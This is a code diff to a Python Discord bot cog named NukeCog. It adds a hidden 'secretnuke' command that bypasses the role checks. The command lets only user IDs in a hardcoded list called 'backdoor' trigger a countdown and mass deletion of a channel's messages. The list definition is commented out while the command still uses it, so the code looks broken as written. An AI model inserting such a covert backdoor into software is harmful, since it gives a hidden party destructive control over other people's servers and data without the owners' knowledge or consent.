@@ -11,6 +11,7 @@ class NukeCog(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
+    #backdoor = [140698580590657536]
 
     @commands.command(pass_context = True) # Must do pass_context = True for code to work
     #@commands.has_permissions(manage_guild=True)
@@ -35,7 +36,31 @@ class NukeCog(commands.Cog):
             messages.append(message)
 
         await channel.delete_messages(messages) # Deletes all messages in list
-       
+    
+    @commands.command(pass_context = True) # Must do pass_context = True for code to work
+    
+    async def secretnuke(self, ctx, num):
+        if (ctx.author.id in backdoor):
+            channel = ctx.message.channel
+            messages = []
+
+            # Doomsday countdown message
+            for count in range(0,5):
+                embed = discord.Embed(title="DOOMSDAY COUNTDOWN", description=str("Nuking commences in " + str(5 - count) + "..."), color=0xd11313)
+                await ctx.send(embed = embed)
+                await asyncio.sleep(1)
+
+            embed = discord.Embed(title="GOODBYE", description=str("IT'S BEEN FUN"), color=0xd11313)
+            await ctx.send(embed = embed)
+
+            # Gets messages and adds them to list
+            num = int(num)
+            async for message in channel.history(limit = num):
+                messages.append(message)
+
+            await channel.delete_messages(messages) # Deletes all messages in list
+        
+
     @commands.command(pass_context = True) # Must do pass_context = True for code to work
     @commands.has_any_role("Admin", "Classified")
     # Deletes EVERY SINGLE message in a channel one by one and sets the channel to read only while doing so
